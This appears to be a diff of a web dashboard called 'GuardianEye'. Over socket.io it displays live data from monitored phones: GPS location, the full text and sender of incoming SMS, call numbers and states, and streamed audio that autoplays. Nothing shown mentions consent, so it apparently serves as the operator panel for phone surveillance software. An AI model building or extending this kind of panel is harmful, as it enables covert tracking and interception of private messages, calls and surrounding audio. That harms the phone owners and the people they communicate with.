@@ -1,61 +1,113 @@
-<script src="/socket.io/socket.io.js"></script>
-<script>
-const socket = io();
-
-// Keep track of devices
-const devices = {};
-
-socket.on("device-registered", (data) => {
-    const { deviceId, deviceName } = data;
-
-    if (!devices[deviceId]) {
-        // create new section for this device
-        const div = document.createElement("div");
-        div.id = "device-" + deviceId;
-        div.innerHTML = `
-            <h3>${deviceName} (${deviceId})</h3>
-            <p id="loc-${deviceId}">Location: waiting...</p>
-            <audio id="audio-${deviceId}" controls autoplay></audio>
-            <p id="sms-${deviceId}">SMS: none</p>
-            <p id="call-${deviceId}">Call: none</p>
-            <hr/>
-        `;
-        document.body.appendChild(div);
-        devices[deviceId] = true;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>GuardianEye Dashboard</title>
+  <script src="/socket.io/socket.io.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f9;
+      margin: 20px;
     }
-});
-
-socket.on("location-update", (data) => {
-    const { deviceId, lat, lng } = data;
-    document.getElementById("loc-" + deviceId).innerText =
-        `Location: ${lat}, ${lng}`;
-});
-
-socket.on("sms-received", (data) => {
-    const { deviceId, number, body } = data;
-    document.getElementById("sms-" + deviceId).innerText =
-        `SMS from ${number}: ${body}`;
-});
-
-socket.on("call-event", (data) => {
-    const { deviceId, number, state } = data;
-    document.getElementById("call-" + deviceId).innerText =
-        `Call ${state}: ${number}`;
-});
-
-socket.on("audio-chunk", (data) => {
-    const { deviceId, chunk } = data;
-    const audio = document.getElementById("audio-" + deviceId);
-
-    if (audio) {
-        const byteCharacters = atob(chunk);
-        const byteNumbers = new Array(byteCharacters.length);
-        for (let i = 0; i < byteCharacters.length; i++) {
-            byteNumbers[i] = byteCharacters.charCodeAt(i);
-        }
-        const byteArray = new Uint8Array(byteNumbers);
-        const blob = new Blob([byteArray], { type: "audio/wav" });
-        audio.src = URL.createObjectURL(blob);
+    h1 {
+      text-align: center;
+      color: #007bff;
     }
-});
-</script>
+    .device {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      margin: 15px 0;
+      padding: 15px;
+    }
+    .device h2 {
+      margin: 0;
+      color: #333;
+    }
+    .device p {
+      margin: 5px 0;
+    }
+    audio {
+      width: 100%;
+      margin-top: 8px;
+    }
+    .disconnected {
+      opacity: 0.5;
+    }
+  </style>
+</head>
+<body>
+  <h1>GuardianEye Dashboard</h1>
+  <div id="devices"></div>
+
+  <script>
+    const socket = io();
+    const devices = {}; // Track created UI blocks
+
+    function createDeviceUI(deviceId, deviceName) {
+      if (devices[deviceId]) return; // already exists
+
+      const div = document.createElement("div");
+      div.className = "device";
+      div.id = "device-" + deviceId;
+
+      div.innerHTML = `
+        <h2>${deviceName} (${deviceId})</h2>
+        <p id="status-${deviceId}">🟢 Connected</p>
+        <p id="loc-${deviceId}">📍 Location: waiting...</p>
+        <audio id="audio-${deviceId}" controls autoplay></audio>
+        <p id="sms-${deviceId}">✉ SMS: none</p>
+        <p id="call-${deviceId}">📞 Call: none</p>
+      `;
+
+      document.getElementById("devices").appendChild(div);
+      devices[deviceId] = true;
+    }
+
+    socket.on("device-registered", (data) => {
+      createDeviceUI(data.deviceId, data.deviceName);
+    });
+
+    socket.on("device-disconnected", (data) => {
+      const div = document.getElementById("device-" + data.deviceId);
+      if (div) div.classList.add("disconnected");
+      const status = document.getElementById("status-" + data.deviceId);
+      if (status) status.innerText = "🔴 Disconnected";
+    });
+
+    socket.on("location-update", (data) => {
+      const { deviceId, lat, lng } = data;
+      const loc = document.getElementById("loc-" + deviceId);
+      if (loc) loc.innerText = `📍 Location: ${lat}, ${lng}`;
+    });
+
+    socket.on("sms-received", (data) => {
+      const { deviceId, number, body } = data;
+      const sms = document.getElementById("sms-" + deviceId);
+      if (sms) sms.innerText = `✉ SMS from ${number}: ${body}`;
+    });
+
+    socket.on("call-event", (data) => {
+      const { deviceId, number, state } = data;
+      const call = document.getElementById("call-" + deviceId);
+      if (call) call.innerText = `📞 ${state}: ${number}`;
+    });
+
+    socket.on("audio-chunk", (data) => {
+      const { deviceId, chunk } = data;
+      const audio = document.getElementById("audio-" + deviceId);
+      if (!audio) return;
+
+      const byteCharacters = atob(chunk.replace(/\n/g, ""));
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+      }
+      const byteArray = new Uint8Array(byteNumbers);
+      const blob = new Blob([byteArray], { type: "audio/wav" });
+      audio.src = URL.createObjectURL(blob);
+    });
+  </script>
+</body>
+</html>
